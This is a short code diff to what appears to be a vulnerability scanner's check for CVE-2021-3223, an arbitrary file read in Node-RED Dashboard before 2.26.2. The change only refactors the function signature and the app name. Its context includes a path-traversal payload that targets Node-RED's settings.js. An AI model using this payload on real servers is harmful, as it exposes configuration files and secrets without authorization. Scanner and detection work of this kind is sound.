@@ -14,7 +14,7 @@ cve_2021_3223_payloads = [
     {'path': 'js/..%2f..%2f..%2f..%2fsettings.js'},
 ]
 
-def cve_2021_3223_scan(self, clients):
+def cve_2021_3223_scan(clients):
     ''' Node-RED由于未对url中传输的路径进行严格过滤, 导致攻击者可构造特殊路径进行任意文件读取
             Node-Red-Dashboard version < 2.26.2
             (Node-Red插件Node-Red-Dashboard, 如果未安装此插件, 或插件版本高于2.26.2, 则不受影响)
@@ -22,7 +22,7 @@ def cve_2021_3223_scan(self, clients):
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Node-RED',
         'vul_type': 'File-Read',
         'vul_id': 'CVE-2021-3223',
     }
